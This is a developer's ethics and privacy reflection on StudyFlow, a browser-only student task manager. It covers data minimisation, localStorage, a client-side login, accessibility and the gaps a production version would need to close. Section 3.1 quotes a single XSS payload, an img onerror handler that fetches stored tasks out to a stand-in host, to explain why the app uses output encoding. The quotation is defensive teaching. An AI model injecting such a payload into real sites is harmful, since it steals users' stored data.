Ethics and privacy reflection

What this application does to handle student data responsibly, what it cannot promise, and why the difference matters when user-generated content is involved.

1. The honest starting point

StudyFlow collects information about a person's study life: what they have to do, for which course, and by when. That data is not sensitive in the medical or financial sense, but it is still personal. It reveals which courses someone is enrolled in, when they are under pressure, and — through the notes field — whatever they choose to write about their own progress or difficulties. A task list is a small diary of someone's semester.

My design position was borrowed from Privacy by Design: privacy should be built into the architecture, not bolted on as a settings page (Cavoukian, 2009). Seven of those principles map onto concrete decisions in this application, and the eighth — the one I could not satisfy — is discussed in section 5.

2. Features that support ethical data use

2.1 Data minimisation

The system asks for exactly six fields: title, course code, course name, due date, description and notes. There is no account registration, no email address, no phone number, no date of birth and no student ID. Every field that is absent is a field that cannot leak, be sold or be subpoenaed. The notes field is optional, and the interface labels it as such, because optionality is what allows a user to withhold information they would rather not record.

2.2 Purpose limitation

The data is used for one thing: drawing the task table. It is not sent to a server, aggregated, profiled or used to infer anything about the user. There are no analytics scripts, no advertising identifiers and no third-party fonts or trackers on these pages — every asset, including the illustrations, is a local file. A user opening the site in their browser is not making a request to anybody except the machine the files sit on.

2.3 Local-only storage

Tasks are written to localStorage under a single key (studyflow.tasks.v1) and never leave the browser. This is a deliberate trade-off. The benefit is that there is no central database to breach, no backup to misconfigure, and no retention period to enforce — when the user clears their browser storage, the data is genuinely gone. The cost is that the data is not encrypted at rest, is readable by any script running on the same origin, and is not synchronised across devices.

2.4 Restricting access behind a login

The task page is not visible until the user authenticates. Practically, this prevents someone glancing at the screen — or opening the page on a shared machine — from reading another person's task list. The session is held in sessionStorage, so it ends when the tab closes rather than persisting for weeks on a library computer.

2.5 Input validation as an ethical control

Validation is usually framed as a data-quality feature. It is also an integrity control: rejecting nonsense input at the boundary keeps the stored record trustworthy for the person who will read it later. The due-date rule is the clearest example — refusing a date in the past prevents a task from being silently born overdue, which would misrepresent the user's own history to them.

3. Features that support data privacy

3.1 Output encoding instead of HTML injection

User text is inserted with textContent, never innerHTML. This matters more than it looks. If a task were rendered with innerHTML, a title such as <img src=x onerror="fetch('https://example.com?d='+localStorage.studyflow.tasks.v1)"> would execute, and every stored task could be exfiltrated to a third party. Because the data is treated as text, that string is displayed literally and does nothing. The rule is applied everywhere a user value reaches the DOM, including the delete confirmation text.

3.2 No unnecessary identifiers

The login gate uses a fixed demonstration account rather than personalised accounts. That is a limitation, but it also means the application never stores a name, an email or a password belonging to a real person. There is nothing to reset, nothing to enumerate and nothing to phish.

3.3 Deletion that actually deletes

Removing a task removes it from the array and rewrites the stored JSON immediately; there is no "soft delete" flag and no shadow copy. Users can also erase everything by clearing site data in the browser, and the interface does not pretend otherwise.

3.4 Transparency

The sign-in panel states that this is a demonstration system and that authentication is client-side only, with a link to this page. A privacy notice that a student can read and understand in thirty seconds is worth more than a long policy nobody opens — but only if it is accurate, including about its own weaknesses.

3.5 Accessibility as an ethical requirement

A tool that a student with a visual impairment cannot use has effectively excluded them. Labels are associated with every input, errors are announced through role="alert" and tied to their field with aria-describedby, the current page is marked with aria-current, focus is moved deliberately after validation and after the delete dialog closes, and text sizes are set in rem so they respect browser zoom. Contrast ratios were checked against the WCAG 2.2 AA thresholds.

4. Where the design has to make a judgement call

Storing tasks locally protects privacy but weakens durability: clearing cookies and site data, or using a different browser, loses the list without warning. I chose privacy over durability because a lost task list is recoverable — the student knows what they had to do — while a leaked one is not. The interface hints at this by keeping the data in the browser and never implying that a copy exists elsewhere.

The login gate is a second judgement call. It provides a real but limited benefit: it stops casual access, not a determined one. Anything stored in the browser can be read by anyone with access to that browser's developer tools. Presenting it as strong security would be dishonest, so the page says what it is.

5. What this system cannot do — and what a real one would need

Client-side authentication is not authentication. In a production version, the following would be non-negotiable:

  • Server-side sessions and hashed credentials — passwords stored with a slow salted hash (bcrypt or Argon2), never in client code, and account state held on a server the user cannot edit.
  • Transport encryption — HTTPS everywhere, so data in transit cannot be read or modified.
  • Collection notice and consent — a plain-language notice at the point of collection, consistent with the Australian Privacy Principles (especially APP 1, open and transparent management, and APP 5, notification of collection).
  • Access, correction and deletion rights — a real export and a real delete, not "clear your browser data and hope".
  • Retention limits — a defined period after which inactive data is destroyed, because indefinite retention is itself a privacy risk.

Naming these gaps is part of the reflection rather than a disclaimer. The ethical obligation of a developer is not to claim that a student prototype is secure; it is to be precise about what it protects, and to make sure the person using it is not misled into trusting it more than it deserves.

6. Conclusion

StudyFlow handles a modest amount of personal data, and it tries to handle it in a way that would still look defensible if the user read the source code — which, in a GitHub repository, they can. Data is minimised, kept local, encoded on output, deletable, and described honestly. The remaining weakness is architectural rather than accidental: a client-side application cannot offer the authentication guarantees of a server-side one, and the page says so rather than papering over it.
